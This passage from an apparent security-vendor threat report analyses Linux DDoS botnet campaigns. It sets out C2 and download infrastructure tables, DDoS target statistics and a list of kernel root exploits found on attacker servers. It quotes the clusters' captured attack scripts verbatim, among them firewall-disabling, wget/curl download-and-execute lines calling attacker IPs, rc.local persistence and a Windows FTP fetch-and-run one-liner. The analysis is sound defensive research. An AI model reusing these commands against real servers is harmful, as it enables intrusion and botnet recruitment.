[61.160.232.197]|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n||||xiaoqiu|pp.pp1987.com:36000 [61.160.232.197]|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n|16|58.218.213.211|58.218.213.211:2568|xudp|58.218.213.211:10991|208.98.15.162:2847|\n||||Manager|wuzu520.com:5506 [111.74.229.77]|360.baidu.com.9kpk. com:45000 [no record]|\n|17|60.163.21.177|60.163.21.177:6663|ddos2.4|ww1.ccmir.com:10000 [43.251.116.61]|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n||||gsaa|ww1.ccmir.com:10000 [43.251.116.61]|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n\n\n-----\n\n|18|60.169.75.99|60.169.75.99:3113|wc1|www.ddoscc.xyz:36000 (Cluster) [202.146.223.111]|ddd.dj6cc.com:45000 (xitele) [120.24.57.79]|\n|---|---|---|---|---|---|\n||||wc|www.ddoscc.xyz:36000 (Cluster) [202.146.223.111]|ddd.dj6cc.com:45000 (xitele) [120.24.57.79]|\n|19|61.160.215.111|122.224.48.28:8000|tooles|122.224.48.28:10991|122.225.108.52:10999|\n|20|61.160.232.221|61.160.232.221:9939|ka|221.232.160.61:48080||\n||||fd|221.232.82.29’:48080||\n|21|61.176.223.77|61.176.223.77:111|zlbq|123.131.52.13:28099|122.225.108.52:10999|\n|||61.176.223.77:222|zlby|123.131.52.13:28099|122.225.108.52:10999|\n||||zlbu|112.253.28.218:10991|122.225.108.52:10999|\n||61.176.222.160|61.176.222.160:111|zlwanby|123.131.52.13:28099|122.225.108.52:10999|\n||||zlwanbq|123.131.52.13:28099|122.225.108.52:10999|\n|||61.176.222.160:222|zlby|123.131.52.13:28099|122.225.108.52:10999|\n||61.176.220.162|61.176.220.162:111|zlbsr|112.253.28.218:9654|360.baidu.com.9kpk. com:45000 [no record]|\n|||61.176.220.162:222|zlbyy|123.131.52.13:28099|122.225.108.52:10999|\n||||zlwanby|123.131.52.13:28099|122.225.108.52:10999|\n\n\nOf the 15 patterns of activity that contain configuration information within their malware, it is possible\nto further reduce that overall number if the following conditions are true:\n\n1) \u0007The Elknot “Second C2” server addresses are the hard coded, non-user configurable server\naddresses and therefore not valid for collapsing patterns into one another\n\n2) \u0007The Backdoor Mode configuration (identified as “Second C2” in the previous table) is user\nconfigurable.\n\n3) \u0007The campaign codes within the BillGates configuration (e.g. “xitele”[16] and “Cluster”) are\nuser-definable.\n\nThe result is a set of 10 observed Infrastructure-TTP based clusters consisting of:\n\n_16 Pinyin for the Chinese transliteration of “Hitler”._\n\n\n-----\n\n|ID|SCANNER IP|DOWNLOAD IP|FILE ON SERVER|BINARY TYPE|FIRST C2|SECONDC2|\n|---|---|---|---|---|---|---|\n|A|107.160.82.189|119.29.55.190:8084|Red- Cat3.6.0_ LinuxRmp_ Plugins|BILL|sbss.f3322.net:58983 [120.27.46.24]||\n|B|117.21.174.174|121.43.225.54:80|PowerEn- terABC|BILL|120.24.228.240:36005|231.78en.com:45000 [no record]|\n|||120.24.228.240:6954|PowerEn- terABC.|BILL|120.24.228.240:36005|231.78en.com:45000 [no record]|\n|C|117.21.176.64|117.21.176.64:4899|http|BILL|117.21.176.64:36000||\n|D|183.61.171.225|183.61.171.225:8818|down|ELKNOT|61.187.98.244:10991|122.225.108.52:10999|\n||||Temp|ELKNOT|61.187.98.244:10991|122.225.108.52:10999|\n|E|192.210.53.43|198.13.96.38:7878|wocao|ELKNOT|198.13.96.38:10991||\n|F|218.10.17.171|114.215.115.152:8080|alima|ELKNOT|114.215.115.152:10991|122.225.108.52:10999|\n|G|61.160.232.221|61.160.232.221:9939|ka|AES|221.232.160.61:48080||\n||||fd|AES|221.232.82.29’:48080||\n|H|61.176.223.77|61.176.223.77:111|zlbq|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n|||61.176.223.77:222|zlby|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n||||zlbu|ELKNOT|112.253.28.218:10991|122.225.108.52:10999|\n||61.176.222.160|61.176.222.160:111|zlwanby|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n||||zlwanbq|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n|||61.176.222.160:222|zlby|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n||61.176.220.162|61.176.220.162:111|zlbsr|BILL|112.253.28.218:9654|360.baidu.com.9kpk. com:45000 [no record]|\n|||61.176.220.162:222|zlbyy|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n||||zlwanby|ELKNOT|123.131.52.13:28099|122.225.108.52:10999|\n||58.218.213.211|58.218.213.211:2568|xudp|ELKNOT|58.218.213.211:10991|208.98.15.162:2847|\n||||Manager|BILL|wuzu520.com:5506 [111.74.229.77]|360.baidu.com.9kpk. com:45000 [no record]|\n\n\n-----\n\n|I|219.235.4.22|219.235.4.22:7878|sos|BILL|xuyiwz.f3322.net:25000|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n|---|---|---|---|---|---|---|\n||||sas|BILL|xuyiwz.f3322.net:25000||\n||222.186.15.246|222.186.15.246:8080|xiaoqiu|BILL|pp.pp1987.com:36000 [61.160.232.197]|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n||||xiao3|ELKNOT|121.42.221.14:10991|208.98.15.162:2847|\n|||121.42.221.14:666|xiao3|ELKNOT|121.42.221.14:10991|208.98.15.162:2847|\n||||xiaoqiu32|BILL|pp.pp1987.com:36000 [61.160.232.197]|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n||||xiaoqiu|BILL|pp.pp1987.com:36000 [61.160.232.197]|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n||60.163.21.177|60.163.21.177:6663|ddos2.4|BILL|ww1.ccmir.com:10000 [43.251.116.61]|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n||||gsaa|BILL|ww1.ccmir.com:10000 [43.251.116.61]|yeyou.t1linux. com:10060 (xitele) [120.24.57.79]|\n||60.169.75.99|60.169.75.99:3113|wc1|BILL|www.ddoscc.xyz:36000 (Cluster) [202.146.223.111]|ddd.dj6cc. com:45000 (xitele) [120.24.57.79]|\n||||wc|BILL|www.ddoscc.xyz:36000 (Cluster) [202.146.223.111]|ddd.dj6cc. com:45000 (xitele) [120.24.57.79]|\n||121.79.133.179|121.79.133.179:443|ud|BILL|121.42.51.23:8888|816.dj6cc.com:45000 (xitele) [120.24.57.79]|\n||||sy|BILL|121.42.51.23:8888|816.dj6cc.com:45000 (xitele) [120.24.57.79]|\n|J|61.160.215.111|122.224.48.28:8000|tooles|ELKNOT|122.224.48.28:10991|122.225.108.52:10999|\n\n\n4.1 INFRASTRUCTURE-TTP CLUSTERING AND THEIR ATTACK SCRIPTS\nThe actors associated with these patterns of activity have been prolific in their attempts to infect\nvulnerable servers. For example, members of one of the groups using these TTPs sent out over\n800 commands, sometimes multiple times during the same day, in an attempt to compromise as\nmany servers as possible and to retain control over those DDoS resources for attacks. The following\nsections provide further details on the observed activity, organized into clusters based on shared\nTTPs; while these clusters of attacks could be conducted by multiple, separate groups of people, they\ncould also be the work of multiple attackers that are part of the same group or share some resources\nbetween groups.\n\n\n-----\n\n4.1.1 INFRASTRUCTURE-TTP CLUSTER A ATTACK SCRIPT\nInfrastructure-TTP Cluster A (“Cluster A”) conducted a one-off attack that had very little impact.\nCluster A attempted to deploy a BillGates variant using a very aggressive script engine consisting of\nthe following commands deployed over a 4 second period:\n\nservice iptables stop\nrm -r /tmp/*\nwget -O /tmp/RedCat3.6.0_LinuxRmp_Plugins http://119.29.55.190:8084/RedCat3.6.0_\nLinuxRmp_Plugins\nchmod 777 /tmp/RedCat3.6.0_LinuxRmp_Plugins\nnohup /tmp/RedCat3.6.0_LinuxRmp_Plugins > /dev/null 2>&1\n/tmp/RedCat3.6.0_LinuxRmp_Plugins\nwget -O /tmp/RedCat3.6.0_LinuxRmp_Plugins http://119.29.55.190:8084/RedCat3.6.0_\nLinuxRmp_Plugins\nchmod 777 /tmp/RedCat3.6.0_LinuxRmp_Plugins\nnohup /tmp/RedCat3.6.0_LinuxRmp_Plugins > /dev/null 2>&1\nsu root\nwget -O /tmp/RedCat3.6.0_LinuxRmp_Plugins http://119.29.55.190:8084/RedCat3.6.0_\nLinuxRmp_Plugins\n./tmp/RedCat3.6.0_LinuxRmp_Plugins\n\nIt is highly unlikely this script would be effective given that there is less than a second between each\nwget command and the command to execute the malware. Because the RedCat3.6.0_LinuxRmp_\nPlugin file is large enough, and the configured HFS’s bandwidth is small enough, the victim machine\nwould not be able to download the binary before the attack script attempts to execute the binary.\n\nCluster A’s attack script has some of the earmarks of the script seen in the MMD video mentioned\nearlier, particularly the use of server iptables stop followed by wget and chmod, but the inclusion of\nrm -r /tmp/* was not found within the base script found by MMD. The use of su root and\nrm -r /tmp/* was observed in the scripts of other Infrastructure-TTP Clusters, specifically Cluster C,\ndetailed below, which may indicate some form of information sharing between attackers leveraging\nthese TTPs.\n\n4.1.2 INFRASTRUCTURE-TTP CLUSTER B ATTACK SCRIPT\nPattern B is a one-off group that Novetta observed issuing attack commands over a single day (April 11,\n2015) in order to install BillGates malware on vulnerable servers. Unlike Cluster A, Cluster B used a more\ndeliberate attack script with longer spacing between commands. Each command has a 5 second wait\nintroduced between them with the exception of the first two commands which have only a half second\ndelay between them. The following list illustrates the commands as observed by Novetta:\n\n\n-----\n\nrm *\nservice iptables stop\nwget http://120.24.228.240:6954/PowerEnterABC\nwget -O /tmp/PowerEnterABC http://120.24.228.240:6954/PowerEnterABC\nchmod 0755 PowerEnterABC\nchmod 0775 PowerEnterABC\nchmod 0777 PowerEnterABC\nchmod u+x PowerEnterABC\n./PowerEnterABCc\nnohup ./PowerEnterABC > /dev/null 2>&1 &\nchattr +i PowerEnterABC\ncd /tmp\nchmod 0755 /tmp/PowerEnterABC\nchmod 0775 /tmp/PowerEnterABC\nchmod 0777 /tmp/PowerEnterABC\nchmod u+x /tmp/PowerEnterABC\n/tmp/PowerEnterABC\nnohup /tmp/PowerEnterABC > /dev/null 2>&1 &\nchattr +i /tmp/PowerEnterABC\nrm /tmp/*\n\nNovetta observed the group issuing a similar script against the same Delilah node 7 hours later.\nThat script was nearly identical to the script presented above with the exception that the first wget\ncommand was replaced with curl and the misspelled ./PowerEnterABCc was correctly issued\nby the actor as ./PowerEnterABC. Like Cluster A, the basic form of the script matches that of the\ntutorial script that MMD found and presented in their video. The repetitive chmod commands is\nunique to this group.\n\n4.1.3 INFRASTRUCTURE-TTP CLUSTER C ATTACK SCRIPT\nCluster C issued an observed 257 commands over a 3-week period. The script and behavior is\nconsistent with the behavior of Cluster A and Group B. Cluster C used the BillGates malware\nexclusively and did not alter its script over time, except when changing file names. The script is highly\nrepetitive in that it performs the download and execute commands 4 times during the same script.\nThe script engine responsible for generating the Elasticsearch attack commands from the script used\na 5 to 10 second period between commands that provides each command, especially the download\ncommands, a greater chance of succeeding when working.\n\nIt is also probable that Cluster C links its attack script with its C2 server or HFS instance. The repetitive\nnature of the commands suggests that the group has a method for determining if an infection is\nsuccessful, and if the infection fails the script will attempt to re-infect up to 3 additional times.\nBelow is the list of commands Novetta observed for Cluster C.\n\n\n-----\n\nservice iptables stop\nrm -r /tmp/*\nwget -O /tmp/Hostys http://117.21.176.64:4899/http\nchmod 777 /tmp/Hostys\nnohup /tmp/Hostys > /dev/null 2>&1\n/tmp/Hostys\n./tmp/Hostys\nwget -O /tmp/Hostus http://117.21.176.64:4899/http\nchmod 777 /tmp/Hostys\nnohup /tmp/Hostys > /dev/null 2>&1\n/tmp/Hostys\n./tmp/Hostys\nwget -O /tmp/Hostus http://117.21.176.64:4899/http\nsu root\nchmod 777 /tmp/Hostys\nnohup /tmp/Hostys > /dev/null 2>&1\n/tmp/Hostys\n./tmp/Hostys\nwget -O /tmp/Hostus http://117.21.176.64:4899/http\nchmod 777 /tmp/Hostys\nnohup /tmp/Hostys > /dev/null 2>&1\n/tmp/Hostys\n./tmp/Hostys\nwget -O /tmp/Hostus http://117.21.176.64:4899/http\n\n4.1.4 INFRASTRUCTURE-TTP CLUSTER D ATTACK SCRIPT\nCluster D attempted to installed Elknot malware on vulnerable systems. Unlike the previously identified\nClusters, Cluster D used a very short sequence of commands to attempt to infect a vulnerable host. The\nentire attack script consists of 6 commands executed over a 21 second time frame:\n\nrm *\ncurl -o /tmp/down http://183.61.171.225:8818/down\nwget -c http://183.61.171.225:8818/down\nchmod 777 /tmp/./down\n/tmp/./down\nrm /tmp/*\n\nThe simplicity of the attack script suggests that the actor does not have any type of automated\nfeedback loop on whether an attack was successful or not. At the very least, however, the attacker\nwas resourceful enough to use two different command line download tools to increase the chances of\na download, and potential infection, being successful.\n\n4.1.5 INFRASTRUCTURE-TTP CLUSTER E ATTACK SCRIPT\nThe attack script of Cluster E is by far the most simplistic and ineffective example of all the Cluster’s\nattack scripts. The attack script consists of the single line\n\n\n-----\n\nwget -O /tmp/wocao http://198.13.96.38:7878/wocao\n\nThe script may very well download the Elknot sample on a vulnerable server, but the actor did not\nexecute any follow up commands to instantiate the malware that it previously downloaded. This\nbehavior was observed by Novetta several times between April 19, 2015 and April 30, 2015 making it\nunlikely that this behavior is the result of testing and more likely the result of an unskilled attacker.\n\n4.1.6 INFRASTRUCTURE-TTP CLUSTER F ATTACK SCRIPT\nOperating over a short period of time (approximately 2 days), Cluster F issued only 42 observed\ncommands against Novetta’s Delilah network in an attempt to install Elknot. The attack script\ndeployed by Cluster F is nearly identical in form to that of Cluster C, with the exception that the script\ndoes not repeat automatically. This may indicate a simpler attack model that does not include any\nform of potentially automatic feedback between the attack script engine and the C2 server or HFS\ninstance.\nThe attack script used by Cluster F is as follows:\n\nrm -r /tmp/*\nservice iptables stop\nwget -O /tmp/alima http://114.215.115.152:8080/alima\nchmod 777 /tmp/alima\nnohup /tmp/alima > /dev/null 2>&1\n/tmp/alima\n./tmp/alima\n\nOne aspect that was not observed in Cluster C but was observed in Cluster F is the use of\nparallelization. Cluster F used their attack script in a parallel fashion in order to attack multiple hosts at\nthe same time.\n\n4.1.7 INFRASTRUCTURE-TTP CLUSTER G ATTACK SCRIPT\nCluster G is the odd man out in terms of malware payloads. Observed over a 24 hour period attempting\nto install Linux/AES.DDoS bots, Cluster G employed an attack script that was identical to that of Cluster\nD save for the fact that it attempted to install two variants of malware at the same time.\n\nrm *\ncurl -o /tmp/fd http://61.160.232.221:9939/fd\nwget -c http://61.160.232.221:9939/fd\nchmod 777 /tmp/./fd\n/tmp/./fd\nrm /tmp/*\nrm *\ncurl -o /tmp/ka http://61.160.232.221:9939/ka\nwget -c http://61.160.232.221:9939/ka\nchmod 777 /tmp/./ka\n/tmp/./ka\nrm /tmp/*\n\n\n-----\n\n4.1.8 INFRASTRUCTURE-TTP CLUSTER H ATTACK SCRIPT\nNovetta observed Cluster H attempting to install both Elknot and BillGates binaries. By far the most\nprolific of the Clusters, with over 820 commands issued in a three week period, Cluster H’s attack\nscripts are identical to Cluster D when installing Elknot variants as seen below:\n\nrm *\ncurl -o /tmp/xudp http://111.74.239.77:8080/xudp\nwget -c http://111.74.239.77:8080/xudp\nchmod 777 /tmp/./xudp\n/tmp/./xudp\nrm /tmp/*\n\nWhen installing BillGates variants, which was observed by Novetta on only 6 separate instances, the\nattack script that Cluster H used to install Elknot is augmented to modify the victim’s /etc/rc.local\nfile as illustrated below:\n\nrm *\ncurl -o /tmp/zlbsr http://61.176.220.162:111/zlbsr\nwget -c http://61.176.220.162:111/zlbsr\nchmod 777 /tmp/./zlbsr\n/tmp/./zlbsr\nnohup /tmp/zlbsr > /dev/null 2>&1\necho “cd /tmp/”>>/etc/rc.local\necho “/tmp/zlbsr”>>/etc/rc.local\necho “/etc/init.d/iptables stop”>>/etc/rc.local\nrm /tmp/*\n\nIt is worth noting that, while the BillGates installation makes an attempt to disable the victim’s\nfirewall at startup, it does not issue the service iptables stop or similar command seen in other\nCluster’s attack scripts. As a result of this oversight, the firewall will remain active until the infrequent\noccurrence of a server reboot.\n\n4.1.9 INFRASTRUCTURE-TTP CLUSTER I ATTACK SCRIPT\nDespite consisting of 5 distinct attack IP addresses, Cluster I sent a relatively low number\nof observed attack commands (226) over the course of three weeks. The bulk of Cluster I’s\ninstallations focused on BillGates variants with only a single Delilah node receiving two different\ncommands to install Elknot.\n\nCluster I introduced the concept of installing Windows binaries on a victim server, a feature not\nfound in the other Clusters. Using a single command, the actor generates an FTP script, executes the\nscript to download a malicious binary, executes the binary and deletes the script. The command, as\nobserved by Novetta, was:\n\ncmd /c @echo open 121.42.51.23>>Ex.dat&@echo 123>>Ex.dat&@echo 123>>Ex.dat&@echo\nbin>>Ex.dat&@echo get csrss.exe>>Ex.dat&@echo bye>>Ex.dat&@echo csrss.exe>>Ex.dat&@ftp\n-s:Ex.dat&del Ex.dat&csrss.exe&csrss.exe&csrss.exe\n\nWhen installing BillGates malware, Cluster I used the same scripts seen being used by Cluster A (complete\nwith the su root command) and Cluster F, depending on the attack IP address issuing the command.\n\n\n-----\n\n4.1.10 INFRASTRUCTURE-TTP CLUSTER J ATTACK SCRIPT\nInitially, Cluster J suffered the same failure to install that Cluster E incurred by issuing only the\nfollowing command:\n\nwget -O /tmp/ruvn http://122.224.48.28:8000/ruvn\n\nAfter a two-week absence, the actors behind Cluster J returned with a new attack script:\n\nwget -O /tmp/ruvn http://122.224.48.28:8000/tooles\nchmod 777 /tmp/*\nchmod 777 /tmp/tooles\n/tmp/tooles\nnohup /tmp/tooles > /dev/null 2>&1\necho “cd /tmp”>>/etc/rc.local\necho “/tmp/tooles”>>/etc/rc.local\necho “/etc/init.d/iptables stop”>>/etc/rc.local\nchmod 777 /tmp/*\n/tmp/tooles\nchmod 777 /tmp/tooles\nnohup /tmp/tooles > /dev/null 2>&1\necho “cd /tmp”>>/etc/rc.local\necho “/tmp/tooles”>>/etc/rc.local\necho “/etc/init.d/iptables stop”>>/etc/rc.local\nrm *\nrm *\nrm *\n\nClearly more in line with the script used by Cluster H, the script fails to properly download the file\nto the correct name (tooles), instead downloading the file as ruvn. What is not apparent from the\nabove script’s content is the time between the download of the file via wget and the rest of the\nscript, starting at the first chmod. The wget command is issued up to three hours ahead of the rest\nof the script. While possible that this could be a failure in the attack script’s engine, the more likely\nreason for this delay is to compensate for a large number of servers simultaneously downloading\nthe tooles file over the attacker’s relatively slow network link. By allowing several hours to pass\nbefore completing the installation process, the attacker was attempting to ensure that their infections\ndownload properly prior to activation, a novel solution to a failure common with other Clusters.\n\nAs seen in Cluster F, Cluster J utilized parallelization when attacking vulnerable servers. Novetta\nobserved on several occasions Delilah nodes with relatively close IP addresses receiving the same\nattack script commands within fractions of a second of one another.\n\n4.2 DISTRIBUTOR NETWORK\nAs mentioned during the Elknot builder analysis earlier in this report, the Elknot Text-box Builder\nproduces the Elknot dropper binaries that contains a hardcoded C2 address and port that the\ndropper will activate in addition to the user-configured Elknot payload binary. The hardcoded C2\ninformation belongs to, in some way or manner, the individual distributing the Text-box builder and\nnot the actors deploying the Elknot malware on infected hosts.\n\n\n-----\n\nSince the hardcoded C2 information cannot be concretely linked to the actors responsible for the\ninfection of the victim servers, there is no additional information regarding the actor or actors\nresponsible for the infrastructure outside of their particular targeting. What is known is that the\nactors using the hardcoded C2 infrastructure are being opportunistic, leveraging someone else’s\nwork of infecting vulnerable servers and operating some level of detachment as a result.\n\nNovetta did observe one of the hardcoded C2 infrastructure (208.98.15.162:2847) issuing a series of\nattack commands. This report will refer to this particular C2 infrastructure as the “Distributor Network.”\n\n4.3 COMMON ATTACK SCRIPT ATTRIBUTES\nEach of the Clusters’ attack scripts had, generally speaking, slight variations between them. Despite\nthe variations, there exists a significant amount of similarity between the various scripts, which may\nreflect a common training such as that provided in the video found by MMD[17]. The following set of\nlists identify the similarities as they pertain to the attack scripts in general and for individual malware\ntypes (BillGates and Elknot).\n\n_General Attack Scripts Attributes:_\n\n  - The majority operate as a blind command execute in that they do not handle feedback directly.\n\n  - (For Linux installations) Rely on common download tools wget and curl for installation.\n\n  - Operate out of the /tmp directory\n\n  - \u0007Attempt to purge the contents of the /tmp directory prior to download and activation of new\nmalware.\n\n  - Attempt to purge the contents of the /tmp directory after activation of the malware\n\n_BillGates Installation Attack Scripts Attributes:_\n\n  - Attempt to shutdown the Linux firewall via iptables\n\n  - Use nohup to capture and suppress output\n\n## Elknot Installation Attack Scripts Attributes:\n • Simpler scripts in comparison to the BillGates installation attack scripts.\n\n  - Do not handle persistence of the malware or modify the /etc/rc.local file\n\n5. ORIGIN ATTRIBUTION\nWith regards to the origins of the activity outlined in this report (Elasticsearch attacks, HFS instances\nbeing used during the attacks, and the C2s controlling the malware after a successful infection), the\nmajority of all IP addresses exist within the Chinese IP space. While some may consider this fact alone\ninsignificant to identify a Chinese point of origin, the server exploitation and malware, as well as other\nartifacts within the infection chain indicate that there is a high probability that those responsible for\nthe activity being presented in this paper are based within China. The following additional artifacts\nprovide support to a Chinese-origin claim:\n\n17 \u0007unixfreaxjp. “China ELF botnet malware infection scheme unleashed”\nhttps://www.youtube.com/watch?v=xehXHy11M9w&index=1&list=PLSe6fLFf1YDX-2sog70220BchQmhVqQ75 7 November 2014.\n\n\n-----\n\n1.\u0007 \u0007The bulk of the HFS instances have simplified Chinese language support enabled, which is not the\ndefault setting.\n\n2. The Elknot and BillGates malware contain simplified Chinese language characters (in Unicode).\n\n3. The Elknot builders use simplified Chinese for dialogues.\n\n4. The Elknot control panel uses simplified Chinese exclusively.\n\n5. \u0007The discovery of a training video by Malwaremustdie.org that includes Chinese language\ninstructions and notes in scripts presented by the video creator.[18]\n\n6. DDOS TARGETS\nNovetta developed a fake Elknot client in order to monitor commands from several active Elknot\nC2 servers.The fake Elknot client would simulate (from the perspective of the C2) an Elknot client’s\nfunctioning and status reporting in order to make the client indistinguishable from a real Elknot\nbinary. By monitoring several C2 servers during the last week of April 2015 and observing the\ncommands the C2 servers would issue, Novetta was able to get a better understanding of the targets\nfor the actors responsible for the various Elknot C2 servers as well as how aggressive the Elknot\nbotnets were being deployed against a target.\n\nThe following Elknot C2 servers were found online, active and issuing commands during Novetta’s\nobservation period:\n\n**INFRASTRUCTURE-** **# OF ATTACK**\n**C2 SERVER**\n**TTP CLUSTER** **COMMANDS ISSUED**\n\n112.253.28.218:10991 H 63\n\n122.224.48.28:10991 J 56\n\n123.131.52.13:28099 H 196\n\n198.13.96.38:10991 E 16\n\n208.98.15.162:2847 “Distributor Network” 218\n\nA total of 549 attack commands were issued targeting 152 unique IPs during Novetta’s observation\nperiod. With each command, the attackers specified the duration of the attack in seconds. The\nsummation of all of the attack commands, across all of the C2 servers, indicates that a total of 44585\nseconds (or slightly over 12 hours) of DDoS traffic was generated based on the instructions of only\n5 C2 servers. On average, a single attack duration for a single attack command was 81 seconds. If\nonly one node with a 10Mb/s network connection responded to the commands, 445 Gb of network\ntraffic would have been generated during Novetta’s observational period. Novetta observed Elknot\nsaturating a 1Gb/s network link in a controlled environment. This behavior multiplied by even a small\nportion of known infected hosts would produce an enormous amount of traffic.\n\n_18 \u0007unixfreaxjp. “China ELF botnet malware infection scheme unleashed”_\n_https://www.youtube.com/watch?v=xehXHy11M9w&index=1&list=PLSe6fLFf1YDX-2sog70220BchQmhVqQ75 7 November 2014._\n\n\n-----\n\nBased on IP addresses, the Elknot botnet only targeted IPs in 5 different countries while under\nobservation. The bulk of the attacks were against Chinese IPs followed by US IP addresses.\n\n**# OF ATTACK** **DURATION OF ATTACKS**\n**TARGET COUNTRY** **UNIQUE IP’s**\n**COMMANDS ISSUED** **(IN SECONDS)**\n\nChina 384 95 26045\n\nUnited States 133 45 9510\n\nSouth Korea 19 6 7920\n\nHong Kong 8 5 450\n\nCanada 5 1 600\n\nWhen viewed from an ASN perspective, the observed attacks targeted only 32 ASNs belonging to\nonly 28 unique companies. The ASNs span a range of interests from ISPs (such as Chinanet, China\nUnicom, Korea Telecom), to DDoS protection providers (such as CloudDDOS Technologies, SharkTech\nand ClearDDoS Technologies), VPS providers (Krypt Technologies and VpsQuan), and CDNs\n(CloudFlare, Alibaba Advertising).\n\nNovetta observed three different attack methods being issued by the Elknot C2 servers:\n\n**# OF ATTACK**\n**ATTACK TYPE**\n**COMMANDS ISSUED**\n\nSYN Flood (0x80) 394\n\nUDP Flood (0x81) 153\n\nPing Flood (0x82) 2\n\n\n-----\n\nWith regards to the targeted port, the following breakdown of targets was observed:\n\n**# OF ATTACK**\n**PORT**\n**COMMANDS ISSUED**\n\n80 301\n\n7306 38\n\n7007 28\n\n52422 20\n\n5603 15\n\n5331 14\n\n7000 13\n\n5242 11\n\n7406 11\n\n9002 11\n\nHaving analyzed the various commands captured by Novetta honeypots and clients, it is apparent\nthat there is no currently observed unified agenda motivating this activity across the entire scope of\nNovetta’s visibility. What remains of interest are the previously highlighted builder-based samples’\nability to provide the original distributor of the malware builder the ability to leverage all victim\nmachines infected via those samples. It is unclear if this is known by those actors who are leveraging\nthe ease of use of the builder based system, or if those actors assume they are the only ones who\nhave access to the resources they have compromised.\n\n7. ADDITIONAL INFILTRATION TOOLS\nBuilding a DDoS infrastructure appears to be the actors’ primary motivation. However, several HFS\ninstances were found to contain local privilege escalation exploits indicating a desire by the actors\nto gain additional control over the victim servers. On a handful of HFS instances, Novetta observed a\nfile named dou.tar.bz2, which contained several ELF executable files and three C source code files.\nThe contents of the archive can be seen referenced in the MMD video mentioned earlier when the\nattacker is establishing the exploitation and infection commands script.\n\nWithin the archive, the ELF files are local privilege escalation exploits for older (2.6) Linux kernels.\nThe C files contain the source code for local privilege escalation exploits for Linux kernels in the 2.6\nbranch. The table below identifies the contents of the dou.tar.bz2 file.\n\n\n-----\n\n**FILENAME** **DESCRIPTION** **SOURCE FILENAME** **CODE SOURCE**\n\n\nA1 “Linux vmsplice Local Root Exploit\nBy qaaz”\n\n\njessica_biel_naked_\nin_my_bed.c\n\n\n[http://sebug.net/](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n[paper/linux_ex-](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n[p/2.6.17-2.6.24.1/2.6.17.c](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n\n\nA2 “Ac1dB1tCh3z VS Linux kernel 2.6 15024.c www.exploit-db.com/\nkernel 0d4y” download/15024/\n\nA3 “Ac1dB1tCh3z VS Linux kernel 2.6 c.c www.exploit-db.com/\nkernel 0d4y” download/15024/\n\nA4 “Linux vmsplice Local Root Exploit root.c [http://sebug.net/](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\nBy qaaz” [paper/linux_ex-](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n[p/2.6.17-2.6.24.1/2.6.17.c](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n\nA5 “Diagnostic tool for public CVE- 2.6.18-164.c [https://www.ksplice.](https://web.archive.org/web/20100922114303/https://www.ksplice.com/support/diagnose-2010-3081.c)\n2010-3081 exploit -- Ksplice, Inc.” [com/support/diag-](https://web.archive.org/web/20100922114303/https://www.ksplice.com/support/diagnose-2010-3081.c)\n[nose-2010-3081.c](https://web.archive.org/web/20100922114303/https://www.ksplice.com/support/diagnose-2010-3081.c)\n\n\nA6 “Linux Kernel 2.6.x PRCTL Core\nDump Handling - Local r00t By:\ndreyer & RoMaNSoFt [ 10.Jul.2006 ]”\n\n\nr00t.c [http://downloads.](http://downloads.securityfocus.com/vulnerabilities/exploits/rs_prctl_kernel.c)\n[securityfocus.com/](http://downloads.securityfocus.com/vulnerabilities/exploits/rs_prctl_kernel.c)\n[vulnerabilities/exploits/](http://downloads.securityfocus.com/vulnerabilities/exploits/rs_prctl_kernel.c)\n[rs_prctl_kernel.c](http://downloads.securityfocus.com/vulnerabilities/exploits/rs_prctl_kernel.c)\n\n\nA7 Unknown xxx.c\n\nA8 “Ac1dB1tCh3z VS Linux kernel 2.6 15024.c www.exploit-db.com/\nkernel 0d4y” download/15024/\n\nA9 “Ac1dB1tCh3z VS Linux kernel 2.6 2.618202009.c www.exploit-db.com/\nkernel 0d4y” download/15024/\n\nA10 “Mempodipper by zx2c4” 1.c [http://git.zx2c4.com/](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n[CVE-2012-0056/tree/](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n[mempodipper.c](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n\nA11 “Linux Kernel 2.6.27.7-generic - 2.6.18 xxx.c [http://www.exploit-db.](http://www.exploit-db.com/exploits/7454/)\n\n        - 2.6.24-1 Denial of service Exploit” [com/exploits/7454/](http://www.exploit-db.com/exploits/7454/)\n\nA12 “Mempodipper by zx2c4” mempodipper.c [http://git.zx2c4.com/](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n[CVE-2012-0056/tree/](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n[mempodipper.c](http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c)\n\nAAA.out “Linux Kernel 2.6.37 <= 3.x.x - PERF_ semtex.c [http://www.exploit-db.](http://www.exploit-db.com/exploits/25444/)\nEVENTS Local Root Exploit” [com/exploits/25444/](http://www.exploit-db.com/exploits/25444/)\n\n\nAA1.c “Linux vmsplice Local Root Exploit” 